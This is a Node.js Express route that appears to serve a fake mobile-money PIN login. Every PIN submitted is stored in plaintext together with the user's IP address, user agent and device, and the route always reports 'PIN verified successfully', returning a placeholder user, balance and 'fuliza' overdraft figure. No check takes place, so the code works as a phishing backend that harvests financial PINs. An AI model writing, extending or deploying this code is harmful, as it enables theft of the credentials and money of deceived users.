const express = require('express');
const router = express.Router();
const PinLog = require('../models/PinLog');
const User = require('../models/User');
const { getMongoStatus } = require('../config/db');
const { getDb, saveDb } = require('../dataStore');

// POST /api/auth/pin
router.post('/pin', async (req, res) => {
  const { pin, device, screen } = req.body;

  if (!pin) {
    return res.status(400).json({ success: false, message: 'PIN is required' });
  }

  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
  const userAgent = req.headers['user-agent'] || 'Unknown Device';

  const logData = {
    pin: pin,
    timestamp: new Date(),
    ip: clientIp,
    userAgent: userAgent,
    device: device || 'Mobile Device',
    screen: screen || 'login',
    valid: true
  };

  let currentUser = null;

  if (getMongoStatus()) {
    try {
      await PinLog.create(logData);
      currentUser = await User.findOne();
    } catch (e) {
      console.error('Mongo PinLog error:', e);
    }
  }

  // Also sync to local JSON
  const db = getDb();
  if (db) {
    db.pinLogs = db.pinLogs || [];
    db.pinLogs.unshift({
      id: Date.now().toString(),
      ...logData
    });
    if (db.pinLogs.length > 100) db.pinLogs = db.pinLogs.slice(0, 100);
    saveDb(db);
    if (!currentUser) currentUser = db.user;
  }

  return res.json({
    success: true,
    message: 'PIN verified successfully',
    user: currentUser || { name: 'Alex Wanjiku', balance: 61.66, fuliza: 100.00 }
  });
});

module.exports = router;

